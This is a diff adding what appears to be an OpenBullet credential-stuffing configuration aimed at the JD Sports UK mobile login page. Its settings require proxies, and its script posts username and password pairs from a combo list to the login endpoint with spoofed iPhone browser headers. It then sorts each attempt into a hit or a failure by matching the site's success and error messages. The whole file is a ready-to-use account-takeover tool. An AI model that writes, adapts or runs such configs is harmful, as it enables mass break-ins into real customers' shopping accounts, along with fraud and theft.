@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "JD SPORTS.co.uk",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-06T19:30:13.5914074+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://m.jdsports.co.uk/myaccount/login/" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"cartMerge\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://m.jdsports.co.uk" 
+  HEADER "Referer: https://m.jdsports.co.uk/myaccount/dashboard/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "You have been logged in" 
+  KEYCHAIN Failure OR 
+    KEY "Sorry we could not log you in. The credentials supplied were not recognised" 
